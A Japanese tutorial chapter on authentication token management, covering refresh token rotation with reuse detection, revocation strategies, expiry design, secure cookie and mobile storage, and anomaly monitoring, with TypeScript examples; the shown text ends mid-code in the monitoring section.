# トークン管理

> Access Token と Refresh Token の適切な管理は認証セキュリティの要。トークンのライフサイクル、Refresh Token Rotation、失効戦略、安全なストレージ、トークンの監視まで、実践的なトークン管理を解説する。

## この章で学ぶこと

- [ ] Access Token と Refresh Token の役割・運用を理解し、ライフサイクル全体を設計できる
- [ ] Refresh Token Rotation の仕組みと攻撃検知メカニズムを実装できる
- [ ] トークンの失効戦略（ブラックリスト・Token Version・RT削除）を比較し、要件に応じて選択できる
- [ ] クライアント・サーバー双方での安全なトークン保存とトランスポートを設計できる
- [ ] トークン監視と異常検知の仕組みを運用環境に組み込める

## 前提知識

- JWT の構造と署名検証の基本 → [02-token-auth/00-jwt-basics.md](./00-jwt-basics.md)
- JWT の署名アルゴリズム（HS256/RS256/ES256）→ [02-token-auth/01-jwt-signing.md](./01-jwt-signing.md)
- セッション認証との違い → [01-session-auth/](../01-session-auth/)
- 認証の基礎概念 → [00-fundamentals/](../00-fundamentals/)
- セキュリティの基礎知識 → [security-fundamentals: 00-basics/](../../security-fundamentals/docs/00-basics/)

---

## 1. トークンのライフサイクル

### 1.1 Access Token と Refresh Token の役割

```
Access Token と Refresh Token の全体像:

  ┌───────────────────────────────────────────────────────────┐
  │                                                           │
  │  Access Token (AT)                                        │
  │  ┌─────────────────────────────────────────────────────┐  │
  │  │ 用途:  API アクセスの認可                             │  │
  │  │ 寿命:  短命（15分〜1時間）                            │  │
  │  │ 検証:  ステートレス（署名確認のみ）                    │  │
  │  │ 形式:  JWT（署名付き自己完結型トークン）               │  │
  │  │ 送信:  Authorization: Bearer <token>                 │  │
  │  └─────────────────────────────────────────────────────┘  │
  │                                                           │
  │  Refresh Token (RT)                                       │
  │  ┌─────────────────────────────────────────────────────┐  │
  │  │ 用途:  新しい AT の取得                               │  │
  │  │ 寿命:  長命（7日〜30日）                              │  │
  │  │ 検証:  ステートフル（サーバー側で管理）                │  │
  │  │ 形式:  不透明トークン（ランダム文字列）                │  │
  │  │ 送信:  HttpOnly Cookie または専用エンドポイント        │  │
  │  └─────────────────────────────────────────────────────┘  │
  │                                                           │
  └───────────────────────────────────────────────────────────┘

  ライフサイクル（時系列）:

  t=0m:   ログイン → AT(15m) + RT(7d) 発行
  t=14m:  API リクエスト → AT 有効 → 成功
  t=16m:  API リクエスト → AT 期限切れ → 401
  t=16m:  RT で AT 更新 → 新AT(15m) + 新RT(7d) 発行
  t=31m:  API リクエスト → 新AT 有効 → 成功
  ...
  t=7d:   RT 期限切れ → 再ログイン要求
```

### 1.2 なぜ 2 つのトークンが必要か

```
2つのトークンが必要な理由（WHY）:

  単一トークンの問題:

  方式①: AT のみ（長命）
    → AT を 30日有効にする
    → 利便性は高いが、漏洩時に 30日間悪用される
    → 失効させるにはサーバー側管理が必要
    → ステートレスの利点が失われる

  方式②: AT のみ（短命）
    → AT を 15分有効にする
    → セキュリティは高いが、15分ごとに再ログイン
    → UX が著しく悪化

  解決策: 2つのトークンの組合せ
    → AT: 短命（15分）でセキュリティを確保
    → RT: 長命（7日）で UX を維持
    → AT はステートレス検証（高速）
    → RT はステートフル管理（即時失効可能）

  ┌──────────────┬────────────────┬──────────────┐
  │              │ セキュリティ     │ UX           │
  ├──────────────┼────────────────┼──────────────┤
  │ AT長命のみ    │ ✗ 低い         │ ○ 良い       │
  │ AT短命のみ    │ ○ 高い         │ ✗ 悪い       │
  │ AT+RT        │ ○ 高い         │ ○ 良い       │
  └──────────────┴────────────────┴──────────────┘
```

### 1.3 トークン発行の実装

```typescript
// トークン発行の完全実装
import { SignJWT, jwtVerify } from 'jose';
import crypto from 'crypto';

// 鍵の設定
const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);
const AT_EXPIRY = '15m';
const RT_EXPIRY_MS = 7 * 24 * 60 * 60 * 1000; // 7日

// トークンのハッシュ関数
function hashToken(token: string): string {
  return crypto.createHash('sha256').update(token).digest('hex');
}

// Access Token の発行
async function issueAccessToken(userId: string, role: string): Promise<string> {
  return new SignJWT({
    sub: userId,
    role,
    type: 'access',
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime(AT_EXPIRY)
    .setJti(crypto.randomUUID()) // 一意の識別子
    .sign(JWT_SECRET);
}

// Refresh Token の発行
function issueRefreshToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// ログイン時のトークンペア発行
async function createTokenPair(userId: string, role: string) {
  const familyId = crypto.randomUUID();
  const accessToken = await issueAccessToken(userId, role);
  const refreshToken = issueRefreshToken();

  // RT はハッシュ化して DB に保存
  await db.refreshToken.create({
    data: {
      token: hashToken(refreshToken),
      userId,
      familyId,
      expiresAt: new Date(Date.now() + RT_EXPIRY_MS),
    },
  });

  return { accessToken, refreshToken, familyId };
}

// Access Token の検証
async function verifyAccessToken(token: string) {
  try {
    const { payload } = await jwtVerify(token, JWT_SECRET);
    if (payload.type !== 'access') {
      throw new Error('Invalid token type');
    }
    return payload;
  } catch (error) {
    throw new AuthError('Invalid or expired access token');
  }
}
```

---

## 2. Refresh Token Rotation

### 2.1 Rotation の仕組み

```
Refresh Token Rotation とは:

  通常のリフレッシュ（Rotation なし）:
    RT-1 → 新AT + RT-1（同じRTを再利用）
    → RTが漏洩すると攻撃者が永久にATを取得可能
    → RT の失効まで対処不能

  Rotation あり:
    RT-1 → 新AT + RT-2（新しいRTを発行、RT-1は無効化）
    RT-2 → 新AT + RT-3（新しいRTを発行、RT-2は無効化）
    → 各RTは1回限りの使用

  攻撃検知のメカニズム:

  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  正常フロー:                                             │
  │    RT-1 使用 → RT-2 発行（RT-1 に usedAt を記録）         │
  │    RT-2 使用 → RT-3 発行（RT-2 に usedAt を記録）         │
  │                                                        │
  │  攻撃シナリオ:                                           │
  │    ① 攻撃者が RT-1 を窃取                                │
  │    ② 正規ユーザーが RT-1 を使用 → RT-2 発行               │
  │    ③ 攻撃者が RT-1 を使用 → 既に usedAt あり！            │
  │    ④ サーバーが「再利用」を検知                            │
  │    ⑤ そのファミリー（RT-1, RT-2, ...）を全て無効化         │
  │    ⑥ ユーザーに再ログインを要求 + セキュリティ通知          │
  │                                                        │
  └────────────────────────────────────────────────────────┘

  ファミリー（Token Family）:
    → ログイン時に familyId を発行
    → そのログインセッションから派生した全 RT が同じ familyId を持つ
    → 再利用検知時に familyId で一括無効化
```

### 2.2 Rotation の完全実装

```typescript
// Refresh Token Rotation の実装
interface RefreshTokenRecord {
  id: string;
  token: string;         // ハッシュ化済み
  userId: string;
  familyId: string;      // トークンファミリー
  expiresAt: Date;
  usedAt: Date | null;   // 使用済みフラグ
  replacedBy: string | null; // 後継トークンのハッシュ
  createdAt: Date;
  ipAddress: string | null;
  userAgent: string | null;
}

class TokenRotationService {
  constructor(
    private db: PrismaClient,
    private logger: Logger
  ) {}

  // トークンリフレッシュ（Rotation 付き）
  async refreshTokens(
    refreshToken: string,
    clientInfo: { ip: string; userAgent: string }
  ) {
    const hashedToken = hashToken(refreshToken);

    // 現在の RT を検索
    const currentRT = await this.db.refreshToken.findUnique({
      where: { token: hashedToken },
      include: { user: true },
    });

    // 存在しない RT
    if (!currentRT) {
      this.logger.warn('Unknown refresh token used', { hashedToken });
      throw new AuthError('Invalid refresh token');
    }

    // 期限切れチェック
    if (currentRT.expiresAt < new Date()) {
      this.logger.info('Expired refresh token used', {
        userId: currentRT.userId,
        familyId: currentRT.familyId,
      });
      throw new AuthError('Refresh token expired');
    }

    // ★ 再利用検知（最重要セキュリティチェック）
    if (currentRT.usedAt) {
      this.logger.error('Refresh token reuse detected!', {
        userId: currentRT.userId,
        familyId: currentRT.familyId,
        originalUseTime: currentRT.usedAt,
        reuseTime: new Date(),
      });

      // トークンファミリー全体を無効化
      await this.db.refreshToken.deleteMany({
        where: { familyId: currentRT.familyId },
      });

      // セキュリティアラートを送信
      await this.notifyTokenReuse(currentRT.userId, clientInfo);

      throw new AuthError('Refresh token reuse detected - all sessions revoked');
    }

    // 新しいトークンペアを生成
    const newAccessToken = await issueAccessToken(
      currentRT.userId,
      currentRT.user.role
    );
    const newRefreshToken = issueRefreshToken();
    const hashedNewRT = hashToken(newRefreshToken);

    // トランザクションで原子的に更新
    await this.db.$transaction([
      // 現在の RT を使用済みにマーク
      this.db.refreshToken.update({
        where: { id: currentRT.id },
        data: {
          usedAt: new Date(),
          replacedBy: hashedNewRT,
        },
      }),
      // 新しい RT を作成
      this.db.refreshToken.create({
        data: {
          token: hashedNewRT,
          userId: currentRT.userId,
          familyId: currentRT.familyId, // 同じファミリー
          expiresAt: new Date(Date.now() + RT_EXPIRY_MS),
          ipAddress: clientInfo.ip,
          userAgent: clientInfo.userAgent,
        },
      }),
    ]);

    this.logger.info('Token rotation completed', {
      userId: currentRT.userId,
      familyId: currentRT.familyId,
    });

    return {
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
    };
  }

  // セキュリティアラート通知
  private async notifyTokenReuse(
    userId: string,
    clientInfo: { ip: string; userAgent: string }
  ) {
    const user = await this.db.user.findUnique({ where: { id: userId } });
    if (!user?.email) return;

    await sendEmail({
      to: user.email,
      subject: 'セキュリティアラート: 不審なトークン使用を検知',
      html: `
        <h2>不審なアクティビティを検知しました</h2>
        <p>あなたのアカウントのリフレッシュトークンが再利用されました。</p>
        <p>安全のため、全セッションを無効化しました。</p>
        <p><strong>IP:</strong> ${clientInfo.ip}</p>
        <p><strong>User-Agent:</strong> ${clientInfo.userAgent}</p>
        <p>再度ログインしてください。心当たりがない場合はパスワードを変更してください。</p>
      `,
    });
  }
}
```

### 2.3 Token Family の管理

```typescript
// Token Family の可視化と管理
class TokenFamilyManager {
  constructor(private db: PrismaClient) {}

  // ユーザーのアクティブなセッション一覧
  async getActiveSessions(userId: string) {
    // 各ファミリーの最新 RT を取得
    const latestTokens = await this.db.refreshToken.findMany({
      where: {
        userId,
        usedAt: null, // 未使用（= アクティブ）
        expiresAt: { gt: new Date() }, // 未期限切れ
      },
      orderBy: { createdAt: 'desc' },
      select: {
        familyId: true,
        createdAt: true,
        ipAddress: true,
        userAgent: true,
        expiresAt: true,
      },
    });

    return latestTokens.map((t) => ({
      sessionId: t.familyId,
      createdAt: t.createdAt,
      ipAddress: t.ipAddress,
      device: parseUserAgent(t.userAgent),
      expiresAt: t.expiresAt,
    }));
  }

  // 特定セッションの無効化（ログアウト）
  async revokeSession(userId: string, familyId: string) {
    const deleted = await this.db.refreshToken.deleteMany({
      where: { userId, familyId },
    });

    return { revokedCount: deleted.count };
  }

  // 全セッションの無効化（パスワード変更時など）
  async revokeAllSessions(userId: string, exceptFamilyId?: string) {
    const where: any = { userId };
    if (exceptFamilyId) {
      where.familyId = { not: exceptFamilyId };
    }

    const deleted = await this.db.refreshToken.deleteMany({ where });
    return { revokedCount: deleted.count };
  }

  // 期限切れトークンのクリーンアップ（定期バッチ）
  async cleanupExpiredTokens() {
    const deleted = await this.db.refreshToken.deleteMany({
      where: {
        OR: [
          { expiresAt: { lt: new Date() } },
          // 使用済みで7日以上経過（監査ログとして一定期間保持）
          {
            usedAt: { not: null },
            usedAt: { lt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) },
          },
        ],
      },
    });

    return { cleanedCount: deleted.count };
  }
}
```

---

## 3. クライアント側のトークン更新

### 3.1 Axios インターセプターによる自動リフレッシュ

```typescript
// Axios インターセプターによる自動リフレッシュ（完全実装）
import axios, { AxiosError, AxiosRequestConfig, InternalAxiosRequestConfig } from 'axios';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true, // Cookie を自動送信
});

// リフレッシュ状態の管理
let isRefreshing = false;
let failedQueue: Array<{
  resolve: (value?: unknown) => void;
  reject: (error: unknown) => void;
}> = [];

// キューに溜まったリクエストを処理
function processQueue(error: unknown, token: string | null) {
  failedQueue.forEach(({ resolve, reject }) => {
    if (error) {
      reject(error);
    } else {
      resolve(token);
    }
  });
  failedQueue = [];
}

// レスポンスインターセプター
api.interceptors.response.use(
  (response) => response,
  async (error: AxiosError) => {
    const originalRequest = error.config as InternalAxiosRequestConfig & { _retry?: boolean };

    // 401 以外のエラー、またはリトライ済みの場合はそのまま返す
    if (error.response?.status !== 401 || originalRequest._retry) {
      return Promise.reject(error);
    }

    // リフレッシュエンドポイント自体の失敗は再試行しない
    if (originalRequest.url === '/auth/refresh') {
      return Promise.reject(error);
    }

    // 既にリフレッシュ中なら待機キューに入れる
    if (isRefreshing) {
      return new Promise((resolve, reject) => {
        failedQueue.push({ resolve, reject });
      }).then(() => api(originalRequest));
    }

    originalRequest._retry = true;
    isRefreshing = true;

    try {
      // トークンリフレッシュ（Cookie ベースなら自動送信）
      await api.post('/auth/refresh');

      // キューのリクエストを再実行
      processQueue(null, null);

      // 元のリクエストを再実行
      return api(originalRequest);
    } catch (refreshError) {
      // リフレッシュ失敗 → 全てのリクエストを失敗させる
      processQueue(refreshError, null);

      // ログインページへリダイレクト
      window.location.href = '/login?reason=session_expired';
      return Promise.reject(refreshError);
    } finally {
      isRefreshing = false;
    }
  }
);

export default api;
```

### 3.2 fetch API でのリフレッシュ実装

```typescript
// fetch API ベースのリフレッシュ実装
class AuthenticatedFetch {
  private refreshPromise: Promise<void> | null = null;

  async request(url: string, options: RequestInit = {}): Promise<Response> {
    const response = await fetch(url, {
      ...options,
      credentials: 'include', // Cookie 送信
    });

    if (response.status === 401) {
      // リフレッシュを試みる
      await this.refresh();

      // 元のリクエストを再試行
      const retryResponse = await fetch(url, {
        ...options,
        credentials: 'include',
      });

      if (retryResponse.status === 401) {
        // リフレッシュ後も 401 → ログアウト
        this.handleSessionExpired();
        throw new Error('Session expired');
      }

      return retryResponse;
    }

    return response;
  }

  private async refresh(): Promise<void> {
    // 同時に複数のリフレッシュが走らないようにする
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include',
    }).then((res) => {
      if (!res.ok) {
        throw new Error('Refresh failed');
      }
    }).finally(() => {
      this.refreshPromise = null;
    });

    return this.refreshPromise;
  }

  private handleSessionExpired(): void {
    // セッション切れのイベントを発火
    window.dispatchEvent(new CustomEvent('session-expired'));
    window.location.href = '/login?reason=session_expired';
  }
}

export const authenticatedFetch = new AuthenticatedFetch();
```

### 3.3 React Hook でのトークン管理

```typescript
// React Hook: セッション状態管理
import { useEffect, useCallback, useRef } from 'react';

function useTokenRefresh() {
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  // AT の残り時間を計算して自動リフレッシュ
  const scheduleRefresh = useCallback((expiresIn: number) => {
    if (timerRef.current) {
      clearTimeout(timerRef.current);
    }

    // 有効期限の 80% が経過したらリフレッシュ
    const refreshTime = expiresIn * 0.8 * 1000;

    timerRef.current = setTimeout(async () => {
      try {
        const res = await fetch('/api/auth/refresh', {
          method: 'POST',
          credentials: 'include',
        });

        if (res.ok) {
          const data = await res.json();
          scheduleRefresh(data.expiresIn); // 次のリフレッシュをスケジュール
        } else {
          // リフレッシュ失敗
          window.dispatchEvent(new CustomEvent('session-expired'));
        }
      } catch (error) {
        console.error('Token refresh failed:', error);
      }
    }, refreshTime);
  }, []);

  // コンポーネントのクリーンアップ
  useEffect(() => {
    return () => {
      if (timerRef.current) {
        clearTimeout(timerRef.current);
      }
    };
  }, []);

  return { scheduleRefresh };
}
```

---

## 4. トークン失効戦略

### 4.1 失効方法の比較

```
トークン失効が必要な場面:
  → ユーザーがログアウト
  → パスワード変更
  → アカウント無効化（退職者など）
  → セキュリティ侵害の検知
  → ユーザーがデバイスを紛失
  → 管理者によるセッション強制終了
  → 権限変更後の即時反映

失効方法の比較表:

  ┌─────────────────┬────────┬──────────────┬────────┬──────────────┐
  │ 方法             │ 即時性  │ スケーラビリティ│ 複雑度  │ 推奨場面       │
  ├─────────────────┼────────┼──────────────┼────────┼──────────────┤
  │ 短命 AT のみ      │ △ 低い │ ◎ 最高       │ 低     │ 一般的な用途   │
  │ ブラックリスト     │ ◎ 即時 │ △ 要Redis    │ 中     │ 高セキュリティ │
  │ Token Version   │ ○ 準即時│ ○ 良い       │ 中     │ パスワード変更 │
  │ RT 削除          │ △ 低い │ ○ 良い       │ 低     │ ログアウト     │
  │ 複合方式          │ ◎ 即時 │ ○ 良い       │ 高     │ エンタープライズ│
  └─────────────────┴────────┴──────────────┴────────┴──────────────┘

  内部動作の詳細:

  ① 短命 AT のみ:
     → AT の有効期限（15分）まで待つだけ
     → 最もシンプルだが、最大15分間は失効できない
     → 金融・医療系では許容できない

  ② ブラックリスト:
     → 失効した AT の JTI を Redis に保存
     → 各 API リクエストでブラックリストをチェック
     → AT の有効期限後に自動削除（TTL）
     → 即時失効可能だがステートフル（Redis 依存）

  ③ Token Version:
     → ユーザーごとにバージョン番号を管理
     → AT に version を含め、検証時にDB と比較
     → パスワード変更時にバージョンをインクリメント
     → DB アクセスが必要（キャッシュで軽減可能）

  ④ RT 削除:
     → RT を DB から削除
     → 次の AT 更新時に失敗 → 再ログイン
     → 現在の AT が有効な間は効果なし

  ⑤ 複合方式（推奨）:
     → 通常: Token Version で準即時失効
     → 緊急: ブラックリストで即時失効
     → ログアウト: RT 削除 + ブラックリスト
```

### 4.2 ブラックリスト実装

```typescript
// Redis を使ったトークンブラックリスト
import Redis from 'ioredis';

class TokenBlacklist {
  private redis: Redis;
  private prefix = 'token:blacklist:';

  constructor(redisUrl: string) {
    this.redis = new Redis(redisUrl);
  }

  // トークンをブラックリストに追加
  async revoke(jti: string, expiresAt: Date): Promise<void> {
    const ttl = Math.max(
      0,
      Math.ceil((expiresAt.getTime() - Date.now()) / 1000)
    );

    if (ttl > 0) {
      // AT の有効期限まで保持（それ以降は自動削除）
      await this.redis.setex(`${this.prefix}${jti}`, ttl, '1');
    }
  }

  // ユーザーの全トークンを一括失効
  async revokeAllForUser(userId: string): Promise<void> {
    // Token Version の方がユーザー単位の一括失効に適している
    // ブラックリストは個別トークンの失効に使う
    await this.redis.setex(
      `${this.prefix}user:${userId}`,
      900, // 15分（AT の最大有効期限）
      Date.now().toString()
    );
  }

  // トークンが失効済みかチェック
  async isRevoked(jti: string, userId: string, issuedAt: number): Promise<boolean> {
    // 個別トークンのチェック
    const tokenRevoked = await this.redis.exists(`${this.prefix}${jti}`);
    if (tokenRevoked) return true;

    // ユーザー単位の一括失効チェック
    const userRevokedAt = await this.redis.get(`${this.prefix}user:${userId}`);
    if (userRevokedAt && issuedAt < parseInt(userRevokedAt)) {
      return true;
    }

    return false;
  }
}

// ブラックリスト付きの AT 検証
const blacklist = new TokenBlacklist(process.env.REDIS_URL!);

async function verifyAccessTokenWithBlacklist(token: string) {
  const payload = await verifyAccessToken(token);

  const isRevoked = await blacklist.isRevoked(
    payload.jti as string,
    payload.sub as string,
    payload.iat as number
  );

  if (isRevoked) {
    throw new AuthError('Token has been revoked');
  }

  return payload;
}
```

### 4.3 Token Version 実装

```typescript
// Token Version による失効
async function issueAccessTokenWithVersion(userId: string): Promise<string> {
  const user = await db.user.findUnique({
    where: { id: userId },
    select: { role: true, tokenVersion: true },
  });

  if (!user) throw new AuthError('User not found');

  return new SignJWT({
    sub: userId,
    role: user.role,
    token_version: user.tokenVersion, // バージョンを含める
    type: 'access',
  })
    .setProtectedHeader({ alg: 'ES256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .setJti(crypto.randomUUID())
    .sign(privateKey);
}

// 検証時にバージョンをチェック
async function verifyWithTokenVersion(token: string) {
  const { payload } = await jwtVerify(token, publicKey);

  // DB からユーザーの現在のバージョンを取得
  const user = await db.user.findUnique({
    where: { id: payload.sub as string },
    select: { tokenVersion: true, active: true },
  });

  if (!user) {
    throw new AuthError('User not found');
  }

  if (!user.active) {
    throw new AuthError('User account is deactivated');
  }

  // バージョン不一致 → 失効済み
  if (user.tokenVersion !== payload.token_version) {
    throw new AuthError('Token has been revoked (version mismatch)');
  }

  return payload;
}

// パスワード変更時: 全トークンを無効化
async function changePassword(userId: string, newPassword: string) {
  const hashedPassword = await bcrypt.hash(newPassword, 12);

  await db.$transaction([
    // パスワード更新 + バージョンインクリメント
    db.user.update({
      where: { id: userId },
      data: {
        password: hashedPassword,
        tokenVersion: { increment: 1 }, // バージョンを上げる
      },
    }),
    // Refresh Token も全削除
    db.refreshToken.deleteMany({ where: { userId } }),
  ]);
}

// 権限変更時
async function updateUserRole(userId: string, newRole: string) {
  await db.user.update({
    where: { id: userId },
    data: {
      role: newRole,
      tokenVersion: { increment: 1 }, // 権限変更もバージョンアップ
    },
  });

  // RT も全削除して再ログインを要求
  await db.refreshToken.deleteMany({ where: { userId } });
}
```

---

## 5. トークン有効期限の設計

### 5.1 推奨有効期限一覧

```
トークン有効期限の設計ガイド:

  ┌──────────────────┬──────────────┬────────────────────────────────┐
  │ トークン種別       │ 推奨有効期限  │ 理由                           │
  ├──────────────────┼──────────────┼────────────────────────────────┤
  │ Access Token     │ 15分         │ 漏洩リスクと UX のバランス       │
  │ Refresh Token    │ 7日          │ 週1回の再ログインは許容          │
  │ ID Token         │ 1時間        │ ユーザー情報の鮮度              │
  │ Remember Me      │ 30日         │ ユーザー選択の長期セッション     │
  │ Password Reset   │ 1時間        │ 短命にして悪用リスク低減         │
  │ Email Verify     │ 24時間       │ メール確認の猶予               │
  │ API Key          │ 無期限       │ ローテーションで管理            │
  │ OAuth State      │ 10分         │ CSRF 対策、短命にする           │
  │ CSRF Token       │ セッションと同期│ セッションと同じ寿命           │
  │ MFA コード        │ 5分          │ 短命にして総当たりを防止         │
  └──────────────────┴──────────────┴────────────────────────────────┘

  業界別の調整:

  ┌──────────────────┬─────────┬─────────┬─────────────────────────┐
  │ 業界              │ AT 寿命  │ RT 寿命  │ 追加要件                │
  ├──────────────────┼─────────┼─────────┼─────────────────────────┤
  │ 一般 Web アプリ    │ 15分    │ 7日     │ -                       │
  │ 金融・医療         │ 5分     │ 1時間   │ 重要操作時に再認証       │
  │ ソーシャルメディア  │ 1時間   │ 30日    │ UX 重視                 │
  │ モバイルアプリ      │ 15分    │ 90日    │ バイオメトリクス再認証    │
  │ B2B SaaS          │ 15分    │ 14日    │ 組織ポリシーで上書き可能  │
  │ IoT デバイス       │ 1時間   │ 365日   │ デバイス証明書と併用      │
  └──────────────────┴─────────┴─────────┴─────────────────────────┘
```

### 5.2 有効期限の動的設定

```typescript
// ユーザーのリスクレベルに応じた動的な有効期限
interface TokenExpiryConfig {
  accessTokenTTL: number; // 秒
  refreshTokenTTL: number; // ミリ秒
}

function getTokenExpiry(context: {
  user: { role: string; mfaEnabled: boolean };
  request: { ip: string; userAgent: string };
  org?: { sessionPolicy?: string };
}): TokenExpiryConfig {
  // 組織のポリシーが最優先
  if (context.org?.sessionPolicy === 'strict') {
    return {
      accessTokenTTL: 5 * 60,       // 5分
      refreshTokenTTL: 60 * 60 * 1000, // 1時間
    };
  }

  // 管理者は短めの有効期限
  if (context.user.role === 'admin' || context.user.role === 'super_admin') {
    return {
      accessTokenTTL: 10 * 60,       // 10分
      refreshTokenTTL: 24 * 60 * 60 * 1000, // 1日
    };
  }

  // MFA が有効な場合はやや長め（セキュリティが強化されているため）
  if (context.user.mfaEnabled) {
    return {
      accessTokenTTL: 30 * 60,       // 30分
      refreshTokenTTL: 14 * 24 * 60 * 60 * 1000, // 14日
    };
  }

  // デフォルト
  return {
    accessTokenTTL: 15 * 60,        // 15分
    refreshTokenTTL: 7 * 24 * 60 * 60 * 1000, // 7日
  };
}
```

---

## 6. トークンの安全なストレージ

### 6.1 保存場所の比較

```
クライアント側のトークン保存場所:

  ┌──────────────────┬──────────┬──────────┬──────────┬────────────────┐
  │ 保存場所          │ XSS 耐性 │ CSRF 耐性│ 永続性    │ 推奨度          │
  ├──────────────────┼──────────┼──────────┼──────────┼────────────────┤
  │ HttpOnly Cookie  │ ◎        │ △ 要対策 │ ○        │ ★★★ 最推奨    │
  │ メモリ変数        │ ◎        │ ◎       │ ✗ なし   │ ★★ AT のみ    │
  │ sessionStorage   │ △ XSS弱  │ ◎       │ △ タブ限定│ ★ 限定用途     │
  │ localStorage     │ ✗ XSS弱  │ ◎       │ ○        │ ✗ 非推奨       │
  │ Cookie (非HttpOnly)│ ✗ XSS弱│ △       │ ○        │ ✗ 非推奨       │
  └──────────────────┴──────────┴──────────┴──────────┴────────────────┘

  なぜ HttpOnly Cookie が最推奨か:
    → JavaScript からアクセス不可（XSS で盗めない）
    → Secure フラグで HTTPS のみに制限
    → SameSite フラグで CSRF を軽減
    → ブラウザが自動送信（フロントエンド実装がシンプル）

  HttpOnly Cookie の CSRF 対策:
    → SameSite=Lax（デフォルト）or SameSite=Strict
    → Double Submit Cookie パターン
    → CSRF トークンの併用
```

### 6.2 Cookie 設定の実装

```typescript
// 安全な Cookie 設定
import { NextResponse } from 'next/server';

function setTokenCookies(
  response: NextResponse,
  tokens: { accessToken: string; refreshToken: string }
) {
  const isProduction = process.env.NODE_ENV === 'production';

  // Access Token Cookie
  response.cookies.set('access_token', tokens.accessToken, {
    httpOnly: true,      // JavaScript からアクセス不可
    secure: isProduction, // HTTPS のみ（本番環境）
    sameSite: 'lax',     // CSRF 対策
    path: '/api',         // API エンドポイントのみで送信
    maxAge: 15 * 60,      // 15分
  });

  // Refresh Token Cookie
  response.cookies.set('refresh_token', tokens.refreshToken, {
    httpOnly: true,
    secure: isProduction,
    sameSite: 'strict',   // より厳格な CSRF 対策
    path: '/api/auth',     // 認証エンドポイントのみで送信
    maxAge: 7 * 24 * 60 * 60, // 7日
  });

  return response;
}

// Cookie からトークンを削除（ログアウト時）
function clearTokenCookies(response: NextResponse) {
  response.cookies.set('access_token', '', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/api',
    maxAge: 0,
  });

  response.cookies.set('refresh_token', '', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/api/auth',
    maxAge: 0,
  });

  return response;
}
```

### 6.3 モバイルアプリでの安全な保存

```typescript
// React Native: Secure Storage の使用
import * as SecureStore from 'expo-secure-store';

class SecureTokenStorage {
  private static readonly AT_KEY = 'access_token';
  private static readonly RT_KEY = 'refresh_token';

  // トークンの保存（暗号化ストレージ）
  static async saveTokens(tokens: {
    accessToken: string;
    refreshToken: string;
  }): Promise<void> {
    await Promise.all([
      SecureStore.setItemAsync(this.AT_KEY, tokens.accessToken, {
        keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
      }),
      SecureStore.setItemAsync(this.RT_KEY, tokens.refreshToken, {
        keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
      }),
    ]);
  }

  // トークンの取得
  static async getAccessToken(): Promise<string | null> {
    return SecureStore.getItemAsync(this.AT_KEY);
  }

  static async getRefreshToken(): Promise<string | null> {
    return SecureStore.getItemAsync(this.RT_KEY);
  }

  // トークンの削除（ログアウト時）
  static async clearTokens(): Promise<void> {
    await Promise.all([
      SecureStore.deleteItemAsync(this.AT_KEY),
      SecureStore.deleteItemAsync(this.RT_KEY),
    ]);
  }
}
```

---

## 7. トークン監視と異常検知

### 7.1 監視すべきメトリクスと異常パターン

```
トークン監視の設計:

  監視メトリクス:
  ┌───────────────────────────┬──────────────────────────────┐
  │ メトリクス                 │ 異常の閾値                    │
  ├───────────────────────────┼──────────────────────────────┤
  │ リフレッシュ頻度            │ 5分以内に3回以上              │
  │ 同時アクティブセッション数  │ ユーザーあたり10以上           │
  │ 地理的距離                 │ 短時間で不可能な移動           │
  │ 失敗したリフレッシュ        │ 1時間に10回以上              │
  │ ブラックリストサイズ        │ 急増（攻撃の兆候）            │
  │ RT 再利用検知              │ 1件でもアラート               │
  │ 未知の User-Agent          │ パターン変化の検知            │
  └───────────────────────────┴──────────────────────────────┘
```

### 7.2 異常検知の実装

```typescript
// トークン使用の監視と異常検知
class TokenMonitor {
  constructor(
    private redis: Redis,
    private logger: Logger,
    private alertService: AlertService
  ) {}

  // リフレッシュイベントを記録
  async recordRefresh(userId: string, metadata: {
    ip: string;
    userAgent: string;
    familyId: string;
    timestamp: Date;
  }) {
    const key = `token:refresh:${userId}`;

    // 直近のリフレッシュ履歴を Redis のソート済みセットに保存
    await this.redis.zadd(
      key,
      metadata.timestamp.getTime(),
      JSON.stringify(metadata)
    );

    // 1時間以上前のエントリを削除
    await this.redis.zremrangebyscore(
      key,
      '-inf',
      Date.now() - 60 * 60 * 1000
    );

    // 異常パターンをチェック
    await this.checkAnomalies(userId, metadata);
  }

  private async checkAnomalies(userId: string, current: {
    ip: string;
    userAgent: string;
    familyId: string;
    timestamp: Date;
  }) {
    const key = `token:refresh:${userId}`;

    // 1. リフレッシュ頻度チェック（5分以内に3回以上）
    const recentCount = await this.redis.zcount(
      key,
      Date.now() - 5 * 60 * 1000,
      '+inf'
    );

    if (recentCount >= 3) {
      this.logger.warn('High refresh frequency detected', {
        userId,
        count: recentCount,
        window: '5m',
      });
    }

    // 2. 同時セッション数チェック
    const activeSessions = await this.redis.scard(`active_sessions:${userId}`);
    if (activeSessions > 10) {
      this.alertService.send({
        severity: 'high',
        type: 'excessive_sessions',
        userId,
        message: `User has ${activeSessions} active sessions`,
      });
    }

    // 3. 地理的異常チェック（Impossible Travel）
    const lastRefresh = await this.getLastRefresh(userId);
    if (lastRefresh && lastRefresh.ip !== current.ip) {
      const timeDiff = current.timestamp.getTime() -
        new Date(lastRefresh.timestamp).getTime();
      const distance = await this.calculateGeoDistance(
        lastRefresh.ip,
        current.ip
      );

      // 1時間以内に1000km以上の移動は不可能
      if (timeDiff < 60 * 60 * 1000 && distance > 1000) {
        this.alertService.send({
          severity: 'critical',
          type: 'impossible_travel',
          userId,
